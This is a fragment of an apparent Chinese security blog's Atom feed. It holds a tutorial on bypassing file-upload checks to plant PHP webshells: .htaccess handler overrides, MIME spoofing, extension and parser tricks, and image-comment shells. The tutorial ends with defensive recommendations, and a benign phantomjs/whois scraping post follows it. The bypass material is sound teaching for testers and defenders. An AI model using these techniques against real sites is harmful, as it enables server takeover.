-<p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;FilesMatch "wooyun.jpg"&gt;</span> </span><br><span class="line">	<span class="keyword"><span class="common">SetHandler</span></span> application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>本文转自乌云，原文链接：<a href="http://drops.wooyun.org/papers/539。">http://drops.wooyun.org/papers/539。</a><br>]]>
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://ohroot.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web安全" scheme="http://ohroot.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[文件上传小总结]]></title>
-    <link href="http://ohroot.com/2014/11/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
-    <id>http://ohroot.com/2014/11/16/文件上传小总结/</id>
-    <published>2014-11-16T06:36:17.000Z</published>
-    <updated>2015-03-12T14:01:28.000Z</updated>
-    <content type="html"><![CDATA[<p>本文主要总结下文件上传，主要是通过PHP的逻辑解释文件上传中的一些安全问题。在前人总结的基础上自己再琢磨琢磨。。。<br><a id="more"></a></p>
-<p>上传漏洞通常是一个文件上传点，其缺乏相应的安全验证，从而可以上传恶意代码，网站最终被getshell<br>下面我们分情况分析</p>
-<h2 id="无丝毫验证的文件上传">无丝毫验证的文件上传</h2><p>一个简单的文件上传表单通常包含一个HTML表单和PHP脚本。HTML表单呈现给用户，而文件上传功能的通常通过PHP脚本实现。下面是一个例子：</p>
-<p>HTML表单如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">enctype</span>=<span class="value">"multipart/form-data"</span> <span class="attribute">action</span>=<span class="value">"uploader.php"</span> <span class="attribute">method</span>=<span class="value">"POST"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"MAX_FILE_SIZE"</span> <span class="attribute">value</span>=<span class="value">"100000"</span> /&gt;</span></span><br><span class="line">	Choose a file to upload: <span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"uploadedfile"</span> <span class="attribute">type</span>=<span class="value">"file"</span> /&gt;</span><span class="tag">&lt;<span class="title">br</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Upload File"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>PHP代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">	<span class="variable">$target_path</span> = <span class="string">"uploads/"</span>;</span><br><span class="line">	<span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'uploadedfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"The file "</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'uploadedfile'</span>][<span class="string">'name'</span>]) . <span class="string">" has been uploaded"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"There was an error uploading the file, please try again!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当PHP接收POST请求且编码类型是multipart/form-data，它会在一个临时的文件名随机的临时目录创建一个文件（例如/ var/tmp/php6yXOVs）。 PHP也将填充全局数组$_FILES上传的文件的信息:<br>$_FILES [‘UploadedFile的’] [‘name’]：在客户机上的文件的原始名称<br>$_FILES [‘UploadedFile的’] [‘type’]：文件的MIME类型<br>$_FILES [‘UploadedFile的’] [‘size’]：文件的大小（以字节为单位）<br>$_FILES [‘UploadedFile的’][‘tmp_name’]：上传的文件存储在服务器上的临时文件名。<br>PHP函数move_uploaded_file将用户提供的临时文件移动到一个位置。在这种情况下，目的地是服务器根目录以下。因此，文件可以使 用的URL来访问。<br>在这个简单的例子中，由于上传的文件类型没有限制，因此攻击者可以上传一个PHP或.NET等带有恶意代码的文件，可导致服务器被getshell。</p>
-<p>但是这种毫无验证的方式通常不会存在，下面从不同的验证方法上看上传绕过。</p>
-<h2 id="Mime类型验证">Mime类型验证</h2><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。<br>常见的错误是Web开发人员验证文件上传表单时，只检查从PHP返回mime类型。当一个文件被上传到服务器，PHP将设置变量$_FILES[‘UploadedFile’][‘type’]所提供的Web浏览器客户端使用的MIME类型。</p>
-<p>服务器端（tomcat5.5）接收不同浏览器上传的文件时，取得的MIME类型</p>
-<table>
-<thead>
-<tr>
-<th>type</th>
-<th>用IE7上传</th>
-<th>用Firefox3.0上传</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>GIF</td>
-<td>image/gif</td>
-<td>image/gif</td>
-</tr>
-<tr>
-<td>JPG</td>
-<td>image/jpeg</td>
-<td>image/jpeg</td>
-</tr>
-<tr>
-<td>ZIP</td>
-<td>application/x-compressed</td>
-<td>application/octet-stream</td>
-</tr>
-<tr>
-<td>JSP</td>
-<td>text/html</td>
-<td>text/html</td>
-</tr>
-<tr>
-<td>EXE</td>
-<td>application/octet-stream</td>
-<td>application/octet-stream</td>
-</tr>
-</tbody>
-</table>
-<p>常见MIME类型例表：</p>
-<table>
-<thead>
-<tr>
-<th>序号</th>
-<th>内容类型</th>
-<th>文件扩展名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>application/msword</td>
-<td>doc</td>
-<td>Microsoft Word</td>
-</tr>
-<tr>
-<td>2</td>
-<td>application/octet-stream bin</td>
-<td>dms lha lzh exe class</td>
-<td>可执行程序</td>
-</tr>
-<tr>
-<td>3</td>
-<td>application/pdf</td>
-<td>pdf</td>
-<td>Adobe Acrobat</td>
-</tr>
-<tr>
-<td>4</td>
-<td>application/postscript</td>
-<td>ai eps ps</td>
-<td>PostScript</td>
-</tr>
-<tr>
-<td>5</td>
-<td>appication/powerpoint</td>
-<td>ppt</td>
-<td>Microsoft Powerpoint</td>
-</tr>
-<tr>
-<td>6</td>
-<td>appication/rtf</td>
-<td>rtf</td>
-<td>rtf格式</td>
-</tr>
-<tr>
-<td>7</td>
-<td>appication/x-compress</td>
-<td>z</td>
-<td>unix 压缩文件</td>
-</tr>
-<tr>
-<td>8</td>
-<td>application/x-gzip</td>
-<td>gz</td>
-<td>gzip</td>
-</tr>
-<tr>
-<td>9</td>
-<td>application/x-gtar</td>
-<td>gtar</td>
-<td>tar 文档 (gnu 格式 )</td>
-</tr>
-<tr>
-<td>10</td>
-<td>application/x-shockwave-flash</td>
-<td>swf</td>
-<td>MacroMedia Flash</td>
-</tr>
-<tr>
-<td>11</td>
-<td>application/x-tar</td>
-<td>tar</td>
-<td>tar(4.3BSD)</td>
-</tr>
-<tr>
-<td>12</td>
-<td>application/zip</td>
-<td>zip</td>
-<td>winzip</td>
-</tr>
-<tr>
-<td>13</td>
-<td>audio/basic</td>
-<td>au snd</td>
-<td>sun/next 声音文件</td>
-</tr>
-<tr>
-<td>14</td>
-<td>audio/mpeg</td>
-<td>mpeg mp2</td>
-<td>Mpeg 声音文件</td>
-</tr>
-<tr>
-<td>15</td>
-<td>audio/x-aiff</td>
-<td>mid midi rmf</td>
-<td>Midi 格式</td>
-</tr>
-<tr>
-<td>16</td>
-<td>audio/x-pn-realaudio</td>
-<td>ram ra</td>
-<td>Real Audio 声音</td>
-</tr>
-<tr>
-<td>17</td>
-<td>audio/x-pn-realaudio-plugin</td>
-<td>rpm</td>
-<td>Real Audio 插件</td>
-</tr>
-<tr>
-<td>18</td>
-<td>audio/x-wav</td>
-<td>wav</td>
-<td>Microsoft Windows 声音</td>
-</tr>
-<tr>
-<td>19</td>
-<td>image/cgm</td>
-<td>cgm</td>
-<td>计算机图形元文件</td>
-</tr>
-<tr>
-<td>20</td>
-<td>image/gif</td>
-<td>gif</td>
-<td>COMPUSERVE GIF 图像</td>
-</tr>
-<tr>
-<td>21</td>
-<td>image/jpeg</td>
-<td>jpeg jpg jpe</td>
-<td>JPEG 图像</td>
-</tr>
-<tr>
-<td>22</td>
-<td>image/png</td>
-<td>png</td>
-<td>PNG 图像</td>
-</tr>
-</tbody>
-</table>
-<p><strong> 绕过 </strong><br>判断方法：基于不同mime类型多上传几次来测试<br>MIME类型通常在http头中，我们很容易通过抓包，改包的方式去绕过此种验证方式。最常用burp去修改http包。</p>
-<h2 id="限制危险的拓展">限制危险的拓展</h2><p>在另一个例子里，我们遇到了文件上传使用黑名单的做法，作为一项安全措施。从开发者收集制定的危险列表，如果正在上传的文件扩展名包含在列表中，访问会被拒绝。<br>使用危险的文件扩展名，其主要缺点之一是，它几乎不可能编制一份完整的清单，包括攻击者可以使用的所有可能的扩展名。<br>恶意用户可以很容易地绕过该检查上传一个文件名为“.htaccess”，其中包含类似于下面的一行代码：<code>AddType application/x-httpd-php .jpg</code><br>上面的代码行指示ApacheWeb服务器执行jpg图片，好像他们是PHP脚本。攻击者现在可以上传一个jpg扩展名的文件，其中包含PHP代码。通过web浏览器请求一个jpg文件，其中包含PHP的命令phpinfo()函数，Web服务器依旧会执行php代码。</p>
-<h2 id="服务端扩展名验证">服务端扩展名验证</h2><p>一般都是黑名单验证的，这部分建议看一下关于解析漏洞的文章：<a href="http://direwolf.gitcafe.com/2014/11/16/解析漏洞小总结/" target="_blank" rel="external">解析漏洞小总结</a><br>如何绕过：</p>
-<ol>
-<li>找黑名单扩展名的漏网之鱼 – 通常对于asp就是 asa、cer之类，对于php就是php3、php4等</li>
-<li>可能存在大小写绕过漏洞 – 比如 aSp 和 pHp 之类</li>
-<li>特别文件名构造 – 比如发送的 http 包里把文件名改成 help.asp. 或 help.asp_(下划线为空格)，这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改， 然后绕过验证后，会被windows系统自动去掉后面的点和空格。</li>
-<li>IIS或nginx文件名解析漏洞 – 比如 help.asp;.jpg或<a href="http://www.xx.com/help.jpg/2.php。这里注意网上所谓的" target="_blank" rel="external">http://www.xx.com/help.jpg/2.php。这里注意网上所谓的</a> nginx 文件名解析漏洞实际上是 php-fpm 文件名解析漏洞，详见 <a href="http://www.cnbeta.com/articles/111752.htm" target="_blank" rel="external">http://www.cnbeta.com/articles/111752.htm</a></li>
-<li>0×00 截断绕过 – 这个是基于一个组合逻辑漏洞造成的</li>
-<li>双扩展名解析绕过攻击(1) – 基于 web 服务的解析逻辑。比如上传x.php.rar等文件</li>
-<li>双扩展名解析绕过攻击(2) – 基于 web 服务的解析方式（解析漏洞）</li>
-<li>如果在 Apache 的 conf 里有这样一行配置<code>AddHandler php5-script .php</code> 这时只要文件名里包含.php,即使文件名是 test2.php.jpg 也会以 php 来执行</li>
-</ol>
-<h2 id="检查图片头部">检查图片头部</h2><p>当仅允许上传图片的时候, 开发者通常使用PHP的getimagesize函数来检测图片的头部信息。该函数在被调用时将会返回图片的尺寸, 如果图片经验证为无效的, 也就是说图片头部信息不正确, 则会返回 false 值。因此一个开发者一般会检查该函数是否返回true或false,并且通过该信息来验证上传的文件。所以, 如果一个恶意用户试着上传一个内嵌有简单PHP shell的jpg文件的话,该函数会返回false，然后他将不允许上传此文件。然而, 即使这种方式也能被很容易的绕过。如果一个图片在一个图片编辑器内打开, 就如Gimp,用户就可以编辑图片的注释区, 那儿就能插入PHP代码,该图片仍然有一个有效的头部; 因此就绕过了getimagesize函数的检查。<br>这里就是php图片马的原理了。一般我们做图片马尽量不要去损坏图片头信息。</p>
-<h2 id="js验证">js验证</h2><p>判断方法：点击提交，用burp看是否有数据提交到服务器端，或者直接看是否直接弹出不允许的上传类型。<br>绕过方法：</p>
-<ol>
-<li>我们直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可。</li>
-<li>直接更改文件上传JS代码中允许上传的文件扩展名你想要上传的文件扩展名。</li>
-<li>使用本地构造提交表单即可，作相应的更改。</li>
-<li>使用burpsuite或者是fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp即可。这也是最简单，最常用的了。</li>
-</ol>
-<h2 id="通过-htaccess保护上传文件夹">通过.htaccess保护上传文件夹</h2><p>另一种流行的创建安全的文件上传表单的方法是使用.htaccess保护好上传文件存放的文件夹。办法是限制这个文件夹里的脚本文件的执行。这种情形一下一个.htaccess文件一般包含下面的代码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script <span class="class">.php</span> <span class="class">.php3</span> <span class="class">.php4</span> <span class="class">.phtml</span> <span class="class">.pl</span> <span class="class">.py</span> <span class="class">.jsp</span> <span class="class">.asp</span> <span class="class">.htm</span> <span class="class">.shtml</span> <span class="class">.sh</span> <span class="class">.cgi</span></span><br><span class="line">Options –ExecCGI</span><br></pre></td></tr></table></figure></p>
-<p>上面的是另一种形式的黑名单，本身并不是很安全。在PHP手册中，move_uploaded_file一章中，有一个warning:若目标文件已经存在，则会覆盖原文件。因为上传的文件能够而且会覆盖已经存在的同名文件，一个恶意用户很轻易就能用他自己修改过的.htaccess替换掉原来的。进而可以 上传执行特定的恶意脚本。</p>
-<h2 id="客户端验证">客户端验证</h2><p>另一种在文件上传表单中常用的安全技术是在客户端验证上传的文件。一般而言，该技术在ASP.NET应用中更通用一些，因为ASP.NET提供了易用的验证控件。<br>这些验证控件允许开发者对要上传的文件做正则检查，以查出待上传的文件扩展名是否在允许列表中。下面是一段来自微软网站的示例代码:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;asp:FileUpload ID=&#34;FileUpload1&#34; runat=&#34;server&#34; /&#62;&#10;&#60;asp:Button ID=&#34;Button1&#34; runat=&#34;server&#34; OnClick=&#34;Button1_Click&#34; Text=&#34;Upload File&#34; /&#62;&#10;&#60;asp:Label ID=&#34;Label1&#34; runat=&#34;server&#34;&#62;&#60;/asp:Label&#62;&#10;&#60;asp:RegularExpressionValidator id=&#34;RegularExpressionValidator1&#34; runat=&#34;server&#34; ErrorMessage=&#34;Only mp3, m3u or mpeg files are allowed!&#34; ValidationExpression=&#34;^(([a-zA-Z]:)|(&#123;2&#125;w+)$?)((w[w].*))+(.mp3|.MP3|.mpeg|.MPEG|.m3u|.M3U)$&#34; ControlToValidate=&#34;FileUpload1&#34;&#62;&#60;/asp:RegularExpressionValidator&#62;&#10;&#60;asp:RequiredFieldValidator id=&#34;RequiredFieldValidator1&#34; runat=&#34;server&#34; ErrorMessage=&#34;This is a required field!&#34; ControlToValidate=&#34;FileUpload1&#34;&#62;&#60;/asp:RequiredFieldValidator&#62;</span><br></pre></td></tr></table></figure></p>
-<p>这段ASP.NET代码使用了验证控件，所以最终用户只被允许上传.mp3,.mpeg,或者.m3u文件到服务器。若文件类型和这三个指定的文件类型不一致，验证控件将抛出异常，文件也就不会被上传。<br>由于这种文件验证是在客户端完成的，恶意用户很容易就能绕过这一检查。写一段客户端脚本来替换web应用的验证脚本做验证。不用web浏览器，入侵者可以使用可以发送HTTP POST请求的程序来实现上传文件。</p>
-<p><strong> 推荐的解决方案 </strong></p>
-<ul>
-<li><p>定义一个.htaccess文件，只允许访问指定扩展名的文件。不要把.htaccess文件和上传文件放在同一个目录里，应该放在父目录里。一个典型的只允许 gif, jpg, jpeg 和 png文件的.htaccess文件应当包含下面的代码(根据你的需求做调整)。这样也能阻止双扩展名攻击.</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword"><span class="common">deny</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="tag">&lt;Files ~ "^w+.(gif|jpe?g|png)$"&gt;</span></span><br><span class="line">	<span class="keyword"><span class="common">order</span></span> deny,allow</span><br><span class="line">	<span class="keyword"><span class="common">allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="tag">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果可能，把文件上传到root目录以外的目录里。</p>
-</li>
-<li>禁止覆盖已存在的文件（以阻止.htaccess覆盖攻击）</li>
-<li>创建一个mime-type白名单列表。(只允许这个列表里的Mime-type)</li>
-<li>生成一个随机的文件名，并且加上此前生成的文件扩展名、</li>
-<li>不要只依赖客户端验证，这不够。理想的是既有客户端验证也有服务器端验证。</li>
-</ul>
-<p>参考文章:</p>
-<p><a href="http://www.91ri.org/9033.html" target="_blank" rel="external">上传漏洞科普[1]-文件上传表单是Web安全主要威胁</a><br><a href="http://www.91ri.org/9034.html" target="_blank" rel="external">上传漏洞科普[1]-js验证</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>本文主要总结下文件上传，主要是通过PHP的逻辑解释文件上传中的一些安全问题。在前人总结的基础上自己再琢磨琢磨。。。<br>]]>
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://ohroot.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web安全" scheme="http://ohroot.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[phantomjs小试牛刀]]></title>
-    <link href="http://ohroot.com/2014/11/11/phantomjs%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"/>
-    <id>http://ohroot.com/2014/11/11/phantomjs小试牛刀/</id>
-    <published>2014-11-11T12:29:33.000Z</published>
-    <updated>2014-11-11T13:56:32.000Z</updated>
-    <content type="html"><![CDATA[<p>这几天在做批量网站获取whois信息方面的东西，发现了whois信息格式不是统一的，也尝试了很多方法，后来发现万网的数据格式挺不错的，于是就把我引向了phantomjs的学习。<br><a id="more"></a></p>
-<h3 id="0x01起源">0x01起源</h3><p>问题首先是这样的，<a href="http://whois.www.net.cn" target="_blank" rel="external">万网whois查询</a>页面是通过ajax的方式获取whois信息的，传统的urllib等方法爬虫完全不行。于是就开始小研究了下，看到了phantomjs可以配合selenium实现页面信息的爬取，听师兄介绍说<a href="http://jeanphix.me/Ghost.py/" target="_blank" rel="external">Ghost.py</a>也可以实现类似的功能，但是看到phantomjs还具有网页截图的功能，之前自己一直在研究批量网站的截图，又没找到非常棒的解决方案。看别人评价说速度还不错，于是果断决定学习下</p>
-<h3 id="安装phantomjs">安装phantomjs</h3><p>这里只写出ubuntu下面的无脑操作方法，其他环境参考官方教程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/share</span><br><span class="line">sudo wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class="number">1.9</span>.<span class="number">8</span>-linux-x86_64.tar.bz2</span><br><span class="line">sudo tar xjf phantomjs-<span class="number">1.9</span>.<span class="number">8</span>-linux-x86_64.tar.bz2</span><br><span class="line">sudo ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/share/phantomjs-<span class="number">1.9</span>.<span class="number">8</span>-linux-x86_64/bin/phantomjs /usr/<span class="built_in">local</span>/share/phantomjs</span><br><span class="line">sudo ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/share/phantomjs-<span class="number">1.9</span>.<span class="number">8</span>-linux-x86_64/bin/phantomjs /usr/<span class="built_in">local</span>/bin/phantomjs</span><br><span class="line">sudo ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/share/phantomjs-<span class="number">1.9</span>.<span class="number">8</span>-linux-x86_64/bin/phantomjs /usr/bin/phantomjs</span><br></pre></td></tr></table></figure></p>
-<p>测试是否安装成功<code>phantomjs -v</code></p>
-<h3 id="phantomjs实现网页截图">phantomjs实现网页截图</h3><p>下面是其官方给的简单实现<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">'webpage'</span>).create();</span><br><span class="line">page.open(<span class="string">'http://www.baidu.com/'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  page.render(<span class="string">'baidu.png'</span>);</span><br><span class="line">  phantom.exit();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
-<p>测试方法：将上述代码另存为<code>cap.js</code>文件，在命令行下执行<code>phantomjs ./cap.js</code>即可在当前目录生成百度的首页截图，命名为baidu.jpg</p>
-<p>下面是一个更加友好的实现方式，可以自定义图片生成路径和图片的像素<br>使用方法<code>phantomjs cap.js http://www.baidu.com ./baidu.jpg 1024*768</code><br>还可以生成PDF <code>phantomjs cap.js http://www.baidu.com ./baidu.pdf 1024*768</code><br>代码如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">'webpage'</span>).create(),</span><br><span class="line">    address, output, size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (phantom.args.length &lt; <span class="number">2</span> || phantom.args.length &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat]'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'  paper (pdf output) examples: "5in*7.5in", "10cm*20cm", "A4", "Letter"'</span>);</span><br><span class="line">    phantom.exit();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    address = phantom.args[<span class="number">0</span>];</span><br><span class="line">    output = phantom.args[<span class="number">1</span>];</span><br><span class="line">    page.viewportSize = &#123; width: <span class="number">600</span>, height: <span class="number">600</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (phantom.args.length === <span class="number">3</span> &amp;&amp; phantom.args[<span class="number">1</span>].substr(-<span class="number">4</span>) === <span class="string">".pdf"</span>) &#123;</span><br><span class="line">        size = phantom.args[<span class="number">2</span>].split(<span class="string">'*'</span>);</span><br><span class="line">        page.paperSize = size.length === <span class="number">2</span> ? &#123; width: size[<span class="number">0</span>], height: size[<span class="number">1</span>], border: <span class="string">'0px'</span> &#125;</span><br><span class="line">                                           : &#123; format: phantom.args[<span class="number">2</span>], orientation: <span class="string">'portrait'</span>, border: <span class="string">'1cm'</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    page.open(address, <span class="function"><span class="keyword">function</span> <span class="params">(status)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (status !== <span class="string">'success'</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Unable to load the address!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">                page.render(output);</span><br><span class="line">                phantom.exit();</span><br><span class="line">            &#125;, <span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>写成python版本什么的就直接写个脚本在命令行下调用phantomjs生成图片就好了，由于速度差强人意，就没去写，可能是我姿势不对把</p>
-<h3 id="phantomjs实现页面爬虫">phantomjs实现页面爬虫</h3><p>这里还是以<a href="http://whois.www.net.cn" target="_blank" rel="external">万网whois查询</a>为例，直接给出源代码，不啰嗦</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.PhantomJS(executable_path=<span class="string">'/usr/bin/phantomjs'</span>)  <span class="comment">#这里指定phatomjs可执行文件的位置</span></span><br><span class="line">driver.get(<span class="string">"http://whois.www.net.cn/whois/domain/baidu.com"</span>)</span><br><span class="line"><span class="comment">#print driver.page_source</span></span><br><span class="line"><span class="comment">#print dir(driver)</span></span><br><span class="line">regOrg = driver.find_element_by_id(<span class="string">'info_registrantOrganization'</span>).text</span><br><span class="line"><span class="keyword">print</span> regOrg</span><br><span class="line">regEmail = driver.find_element_by_id(<span class="string">'info_registrantEmail'</span>).text</span><br><span class="line"><span class="keyword">print</span> regEmail</span><br><span class="line">regSpon = driver.find_element_by_css_selector(<span class="string">'tbody tr:nth-child(7) td:last-child'</span>).text</span><br><span class="line"><span class="keyword">print</span> regSpon</span><br><span class="line">regFromTime = driver.find_element_by_css_selector(<span class="string">'tbody tr:nth-child(10) td:last-child'</span>).text</span><br><span class="line"><span class="keyword">print</span> regFromTime</span><br><span class="line">regToTime = driver.find_element_by_css_selector(<span class="string">'tbody tr:nth-child(13) td:last-child'</span>).text</span><br><span class="line"><span class="keyword">print</span> regToTime</span><br><span class="line">regNameServer = driver.find_element_by_css_selector(<span class="string">'tbody tr:nth-child(19) td:last-child'</span>).text</span><br><span class="line"><span class="keyword">print</span> regNameServer</span><br><span class="line">infowhoisfull = driver.find_element_by_id(<span class="string">'info_whois_full'</span>).text</span><br><span class="line"><span class="keyword">print</span> infowhoisfull</span><br><span class="line">driver.quit</span><br></pre></td></tr></table></figure>
-<p>写了半天的程序，万网竟然不给批量爬，气死了我。。。抑郁而终！</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>这几天在做批量网站获取whois信息方面的东西，发现了whois信息格式不是统一的，也尝试了很多方法，后来发现万网的数据格式挺不错的，于是就把我引向了phantomjs的学习。<br>]]>
-    
-    </summary>
-    
-      <category term="phantomjs" scheme="http://ohroot.com/tags/phantomjs/"/>
-    
-      <category term="python" scheme="http://ohroot.com/tags/python/"/>
-    
-      <category term="编程" scheme="http://ohroot.com/categories/%E7%BC%96%E7%A8%8B/"/>
     
   </entry>
   
